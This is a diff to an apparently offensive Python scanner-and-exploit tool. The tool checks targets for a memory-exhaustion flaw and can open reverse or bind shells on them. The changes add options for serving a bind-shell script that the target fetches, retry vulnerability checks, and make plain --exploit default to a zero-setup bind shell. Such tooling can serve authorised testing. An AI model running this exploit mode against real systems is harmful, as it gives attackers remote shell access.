@@ -76,7 +76,7 @@ parser.add_argument(
 )
 parser.add_argument(
     "--lhost",
-    help="Host for the target's reverse shell to connect back to (required with --exploit)",
+    help="Host for the target's reverse shell to connect back to (required with --exploit reverse-shell mode)",
 )
 parser.add_argument(
     "--lport",
@@ -116,9 +116,10 @@ parser.add_argument(
     "--bind-port",
     type=int,
     help=(
-        "With --exploit, start a bind shell listening on this port on the "
-        "target instead of a reverse shell; the scanner connects to it and "
-        "drives the session (no catch listener needed)"
+        "With --exploit: port the bind shell listens on, on the TARGET "
+        "(default: 4444). The scanner connects to it and drives the session; "
+        "no catch listener needed. Selects bind mode; --lhost selects "
+        "reverse mode instead"
     ),
 )
 parser.add_argument(
@@ -126,7 +127,25 @@ parser.add_argument(
     action="store_true",
     help=(
         "With --exploit/--bind-port, do not start the local script server; "
-        "the script is assumed to be served already at --lhost/--lport"
+        "the script is assumed to be served already at --serve-host/--serve-port"
+    ),
+)
+parser.add_argument(
+    "--serve-host",
+    help=(
+        "With --exploit/--bind-port: host the target can fetch the bind-shell "
+        "script from (must fit the 14-byte carrier: short DNS name, "
+        "inet_aton short form like '10.1', or '0' for the target's loopback). "
+        "Defaults to --lhost"
+    ),
+)
+parser.add_argument(
+    "--serve-port",
+    type=int,
+    help=(
+        "With --exploit: local port the scanner serves the shell script on "
+        "(default: auto-detected -- a free <=4-digit port for loopback "
+        "targets, 80 for remote targets)"
     ),
 )
 parser.add_argument(
@@ -232,10 +251,13 @@ def enumerate_subdomains(domain):
 
 def is_vulnerable(target):
     """True only when the memory-exhaustion behavior was observed."""
-    res = scan.check_url(target)
-    if res["result"] != scan.UNKNOWN:
-        print(scan.finding_line(res))
-    return res["result"] == scan.MEMORY_EXHAUSTION
+    for attempt in range(2):
+        res = scan.check_url(target)
+        if res["result"] != scan.UNKNOWN:
+            print(scan.finding_line(res))
+            return res["result"] == scan.MEMORY_EXHAUSTION
+        print("Scan attempt %d inconclusive; retrying..." % (attempt + 1))
+    return False
 
 
 def run_scan(targets, log_path=None):
@@ -309,17 +331,27 @@ def run_exploit(args):
             )
             return 1
         ok = exploit.exploit_command(target, args.command, **kwargs)
-    elif args.bind_port:
-        if not args.lhost:
-            parser.error("--bind-port needs --lhost (where the script is served), or pass --command")
+    elif args.bind_port is not None:
+        # Bind mode explicitly selected: the shell listens on the target
+        # (--bind-port, default 4444); the script fetch is served from
+        # serve-host/serve-port (auto-detected when omitted).
+        serve_port = args.serve_port or args.lport
+        if serve_port is not None and not args.no_serve \
+                and not (1 <= serve_port <= 65535):
+            parser.error("--serve-port must be a valid TCP port")
         ok = exploit.exploit_bind(
-            target, args.lhost, args.lport, args.bind_port,
+            target, args.bind_port,
+            serve_host=args.serve_host or args.lhost, serve_port=serve_port,
             serve=not args.no_serve, **kwargs,
         )
-    else:
-        if not args.lhost:
-            parser.error("--exploit needs --lhost (reverse shell target), or pass --command")
+    elif args.lhost:
         ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
+    else:
+        # Plain --exploit: zero-setup bind shell. The script-fetch address is
+        # auto-detected (loopback targets via their own 0.0.0.0; remote
+        # targets via a short form of our source IP on port 80 when it fits).
+        ok = exploit.exploit_bind(target, bind_port=None, serve_host=None,
+                                  serve_port=None, **kwargs)
     return 0 if ok else 1
 
 
